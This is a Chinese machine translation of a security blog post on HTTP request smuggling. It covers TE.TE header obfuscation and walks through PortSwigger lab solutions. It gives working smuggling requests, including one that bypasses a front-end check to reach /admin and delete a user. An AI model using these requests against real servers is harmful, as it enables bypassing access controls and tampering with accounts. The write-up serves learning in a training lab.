<html>
<head>
<title>HTTP request smuggling Explained and Exploited Part 0x2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTTP请求走私解释和利用第0x2部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x2-7768d04883fb?source=collection_archive---------1-----------------------#2022-10-20">https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x2-7768d04883fb?source=collection_archive---------1-----------------------#2022-10-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="34c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨！我叫Hashar Mujahid，今天我们将继续讨论什么是HTTP请求走私漏洞，以及我们如何利用它们。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/33f1b524b74c166ad23e2b380d2834ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/1*oFi05GDYqs6rFDj1yKgIHA.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">图片来自<a class="ae kx" href="https://brightsec.com/" rel="noopener ugc nofollow" target="_blank">亮秒</a></figcaption></figure><p id="641e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想了解什么是HTTP请求走私，我建议您阅读本系列的第1部分。</p><div class="ky kz gp gr la lb"><a rel="noopener  ugc nofollow" target="_blank" href="/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f"><div class="lc ab fo"><div class="ld ab le cl cj lf"><h2 class="bd ir gy z fp lg fr fs lh fu fw ip bi translated">HTTP请求走私解释和利用第0x1部分</h2><div class="li l"><h3 class="bd b gy z fp lg fr fs lh fu fw dk translated">嗨！我的名字是Hashar Mujahid，今天我们将先睹为快请求走私漏洞。</h3></div><div class="lj l"><p class="bd b dl z fp lg fr fs lh fu fw dk translated">infosecwriteups.com</p></div></div><div class="lk l"><div class="ll l lm ln lo lk lp kr lb"/></div></div></a></div><p id="1a0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们将从上一篇博客停止的地方继续。</p><h1 id="25eb" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">TE。TE行为:混淆TE头。</h1><p id="533b" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">在这种情况下，前端和后端都有能力处理<code class="fe mt mu mv mw b">Transfer-Encoding: Chunked</code>头，但是我们将通过某种方式调节头来欺骗其中一方不处理头。</p><p id="89f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">示例:</p><p id="6969" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们将看到一些如何使用<code class="fe mt mu mv mw b">Transfer-Encoding: Chunked</code>头的例子，</p><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="67c4" class="nb lr iq mw b gy nc nd l ne nf"><strong class="mw ir">Transfer-Encoding: xchunked  <br/>Transfer-Encoding : chunked  <br/>Transfer-Encoding: chunked <br/>Transfer-Encoding: x  <br/>Transfer-Encoding:[tab]chunked  <br/>[space]Transfer-Encoding: chunked  <br/>X: X[\n]Transfer-Encoding: chunked  <br/>Transfer-Encoding : chunked</strong></span></pre><p id="f096" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过在块前面添加<code class="fe mt mu mv mw b">x</code>或者在<code class="fe mt mu mv mw b">Transfer-Encoding</code>头前面添加额外的空间来看到这一点。我们可以混淆标题。</p><p id="41ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">每种技术都会产生不同的结果，这取决于它在后端是如何实现的；有些行得通，有些行不通。</p><p id="ac04" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来检测<strong class="jp ir"> TE。TE </strong>漏洞，我们只需要找到一个服务器会忽略而另一个服务器会处理的报头变化。</p><h2 id="72ac" class="nb lr iq bd ls ng nh dn lw ni nj dp ma jy nk nl me kc nm nn mi kg no np mm nq bi translated"><a class="ae kx" href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header" rel="noopener ugc nofollow" target="_blank">实验室:HTTP请求走私，混淆TE头</a></h2><p id="0eed" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">本实验涉及一台前端服务器和一台后端服务器，两台服务器以不同的方式处理重复的HTTP请求头。前端服务器拒绝不使用GET或POST方法的请求。</p><p id="af0d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个实验，偷偷向后端服务器发送一个请求，这样后端服务器处理的下一个请求看起来使用了<code class="fe mt mu mv mw b">GPOST</code>方法。</p><p id="fcb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">剥削:</strong></p><p id="083f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问实验室并捕获对打嗝中继器的请求。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nr"><img src="../Images/298d259e4aec217592f0dfcd493157bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*daZY1E8O4t3QU5qzwEx8cA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">只允许GET和POST</figcaption></figure><p id="8f65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在取消选中repeater中更新的内容长度。</p><p id="0d7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">步骤2:将请求方法更改为“POST”</p><p id="7a59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三步:去掉不必要的页眉。</p><p id="9519" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">步骤4:将内容长度改为4。</p><p id="85e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，对于棘手的部分，我们需要添加我们的传输编码头，并找到一种方法，使我们的后端服务器可以处理它们，前端将忽略它们。</p><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="5dab" class="nb lr iq mw b gy nc nd l ne nf">POST / HTTP/1.1<br/>Host: 0ab8008b037606dfc05d2f1700b60097.web-security-academy.net<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 4<br/>Transfer-Encoding: chunked<br/>Transfer-EncodinG: c\] ===&gt; Obsufcated  header.</span><span id="e9d0" class="nb lr iq mw b gy nw nd l ne nf"><strong class="mw ir">5c ===&gt; repersent the size of chunk in hex == 92 bytes</strong><br/><strong class="mw ir"><em class="nx">GPOST / HTTP/1.1<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 15 ===&gt; Request that will be smuggled to be part of the next request</em></strong></span><span id="2385" class="nb lr iq mw b gy nw nd l ne nf">x=1<br/>0</span></pre><p id="544f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将这个请求发送两次，您应该会收到一个错误。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ny"><img src="../Images/de3e695cc28be4038cebf874fea72fc0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZpiOzfP90B4f5J2qsFXyBA.png"/></div></div></figure><p id="48b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些都是入门攻击。现在我们来看看如何利用这个漏洞对web应用程序进行一些严重的攻击。</p><h1 id="93d4" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">使用HTTP请求走私绕过前端安全控制</h1><p id="3ec3" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">安全控制可以在应用程序的前端和后端实现。让我们考虑一个场景，应用程序的前端由于这个验证而阻止用户访问某些目录<code class="fe mt mu mv mw b">/admin</code>。开发人员没有在后端进行任何验证，所以如果攻击者以某种方式绕过了前端安全性，后端会用对请求的响应来回应他。</p><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="c525" class="nb lr iq mw b gy nc nd l ne nf">POST /home HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 62 <br/>Transfer-Encoding: chunked  </span><span id="6090" class="nb lr iq mw b gy nw nd l ne nf">0  <br/>GET /admin HTTP/1.1 <br/>Host: vulnerable-website.com <br/>Foo: xGET /home HTTP/1.1 <br/>Host: vulnerable-website.com</span></pre><p id="bdda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">前端服务器在这里看到两个请求，都是针对<code class="fe mt mu mv mw b">/home</code>的，因此请求被转发到后端服务器。然而，后端服务器看到一个对<code class="fe mt mu mv mw b">/home</code>的请求和一个对<code class="fe mt mu mv mw b">/admin</code>的请求。它(像往常一样)假设请求已经通过了前端控件，因此授予对受限URL的访问权限。</p><h2 id="b54a" class="nb lr iq bd ls ng nh dn lw ni nj dp ma jy nk nl me kc nm nn mi kg no np mm nq bi translated"><a class="ae kx" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" rel="noopener ugc nofollow" target="_blank">实验室:利用HTTP请求走私绕过前端安全控制，CL。TE漏洞</a>。</h2><p id="95b3" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">本实验涉及前端和后端服务器，前端服务器不支持分块编码。有一个管理面板<code class="fe mt mu mv mw b">/admin</code>，但前端服务器阻止访问它。</p><p id="1924" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个问题，向访问管理面板并删除用户<code class="fe mt mu mv mw b">carlos</code>的后端服务器发送一个请求。</p><p id="855e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解决方案:</p><p id="d0e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们知道，前端不支持组块编码。因此，我们可以通过使用CL来尝试绕过前端安全控制。TE攻击。</p><p id="ada8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问实验室并将请求发送到打嗝中继器。</p><p id="c849" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将请求方法更改为POST并删除多余的标头。</p><p id="7ce5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的请求应该是这样的。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi nz"><img src="../Images/a826b50c7d1fc5b112a077d4f874b039.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tHBldS8bSW-56-XSqLwbfA.png"/></div></div></figure><p id="5c26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在添加我们的传输编码头，前端忽略，后端处理。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oa"><img src="../Images/4ffcd0654906312cdef4c5f9f0a22e2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eULygT8tNKuNXj5CD4RDIA.png"/></div></div></figure><p id="c6de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要走私我们的请求，将我们带到管理面板。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi ob"><img src="../Images/c51c01c1d205ca2d5a76b8a6e5ee9156.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9zNrJzgDcLFlVVlbswvowQ.png"/></div></div></figure><p id="8d4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们的请求格式不正确。让我们多修补一下。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oc"><img src="../Images/2d0df5b717a0acb9e2c675eb328efff8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JTEbbjf8lIDiG2hU_2N69A.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk">401</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi od"><img src="../Images/9a76bb1b5bc973f4055a53dfb6b080ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aWQRacVLn4F1SWsuzhwb5Q.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">只有本地用户可以访问该面板</figcaption></figure><p id="21e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道是什么导致了401。</p><p id="6d9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通常可以通过添加一个带有localhost值init的主机头来绕过它。</p><p id="ac03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mt mu mv mw b">HOST: localhost</code></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi oe"><img src="../Images/f738930b0b6acb7af8f5d22169ad19d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qKpuXPSF0dgGJZjjLX-8XA.png"/></div></div></figure><p id="c4b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">服务器检测到两个主机标头，并拒绝第二个请求。</p><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="e2bb" class="nb lr iq mw b gy nc nd l ne nf">GET /admin HTTP/1.1 <br/><strong class="mw ir">Host: localhost ===&gt; 2 host headers are cusing problem</strong><br/>X-Ignore: X<br/>POST / HTTP/1.1 <br/><strong class="mw ir">Host: YOUR-LAB-ID.web-security-academy.net </strong><br/>Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 54 <br/>Transfer-Encoding: chunked</span></pre><p id="3238" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要将我们的走私请求作为一个单独的请求，而不是将其与我们的第二个请求合并。</p><p id="3557" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过添加一个新行和一个参数来做到这一点，这样第二个请求将被附加到被发送的请求的正文中。</p><p id="d409" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像这样</p><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="b003" class="nb lr iq mw b gy nc nd l ne nf">Headers<br/>GET /admin HTTP/1.1 <br/><strong class="mw ir">Host: localhost ===&gt; 2 host headers are cusing problem</strong></span><span id="f960" class="nb lr iq mw b gy nw nd l ne nf">x=POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded <br/>Content-Length: 54 <br/>Transfer-Encoding: chunked</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi of"><img src="../Images/2ec44f2f6665ae7074d4e7b049521677.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aPQQbJgTXtGFe-ithRU4TQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">管理面板</figcaption></figure><p id="fd37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以访问管理面板了。</p><p id="aa6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">删除卡洛斯！！！！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi og"><img src="../Images/07f8e9c7d57bfd11dda5ec7549036daf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aD4JdB8pSKny4JpQXjXvjw.png"/></div></div></figure><pre class="km kn ko kp gt mx mw my mz aw na bi"><span id="3dcf" class="nb lr iq mw b gy nc nd l ne nf">0</span><span id="ad2b" class="nb lr iq mw b gy nw nd l ne nf">GET /admin/delete?username=carlos HTTP/1.1<br/>Host: localhost</span><span id="b0b1" class="nb lr iq mw b gy nw nd l ne nf">x=</span></pre><p id="bc3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这表明，只有4行恶意文字，我们能够删除他人的帐户。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ns nt di nu bf nv"><div class="gh gi od"><img src="../Images/72ea9703e327fd8e5f148ba0f97a6102.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JKFluPlsYvBd-q40Bq2mEQ.png"/></div></div></figure><p id="93da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使对我来说，这也是一个难以理解的话题。</p><p id="c5ca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你能像我喜欢制作它一样喜欢阅读它。</p><p id="4589" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您想了解更多关于HTTP请求走私的知识，请考虑跟随我。</p><p id="9957" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">直到那时，快乐的黑客！</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="oh oi l"/></div></figure></div><div class="ab cl oj ok hu ol" role="separator"><span class="om bw bk on oo op"/><span class="om bw bk on oo op"/><span class="om bw bk on oo"/></div><div class="ij ik il im in"><h2 id="9693" class="nb lr iq bd ls ng nh dn lw ni nj dp ma jy nk nl me kc nm nn mi kg no np mm nq bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kx" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>